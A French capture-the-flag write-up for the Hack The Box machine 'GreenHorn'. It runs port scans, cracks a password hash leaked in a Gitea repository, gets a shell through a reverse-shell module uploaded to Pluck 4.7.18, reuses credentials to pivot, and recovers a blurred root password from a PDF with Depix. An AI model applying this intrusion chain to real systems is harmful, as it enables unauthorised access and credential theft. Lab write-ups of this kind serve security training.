  # GreenHorn

	echo "10.10.11.25 greenhorn.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.25 -e tun0 > ports.txt
	sudo nmap -p- -sCV -T4 10.10.11.25 -oN nmap.txt
	feroxbuster --silent -u http://greenhorn.htb
	
Scans classiques.

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http    nginx 1.18.0 (Ubuntu)
    3000/tcp open  http    Golang net/http server


Gitea avec inscription sur http://greenhorn.htb:3000

Dépôt présent sur http://greenhorn.htb:3000/explore/repos

http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php => Hash de mot de passe faible

     hashcat -m 1700 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163' rockyou.txt  --force
     
Ce mot de passe permet de se connecter sur la page admin.php du site principal. 

On voit que c'est un Pluck v4.7.18

Il existe une RCE : https://www.exploit-db.com/exploits/51592

En installant un module au format .zip et contenant un reverse-shell, on obtient une connexion en tant que www-data.

## Pivoting

On voit un utilisateur "junior" dans /home et le mot de passe trouvé plus tôt fonctionne pour lui : 

    su - junior
	cat user.txt	 

## Élévation de privilèges

En plus du flag on voit un tutoriel au format PDF. En l'inspectant, on remarque un mot de passe flouté : 

    python -m http.server 8888
    ...
    curl http://10.10.11.25/'Using OpenVAS.pdf' -o root.pdf 
    
On peut retirer le floutage grâce à Depix : https://github.com/spipm/Depix 

    sudo apt-get install poppler-utils graphicsmagick-imagemagick-compat
    pdfimages -j root.pdf root
    mogrify -format png root-000.ppm
    python3 depix.py -p root-000.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o root.png 
    
On a bien le mot de passe de root en clair sur la nouvelle image : 

    ssh root@10.10.11.25
	cat /root/root.txt
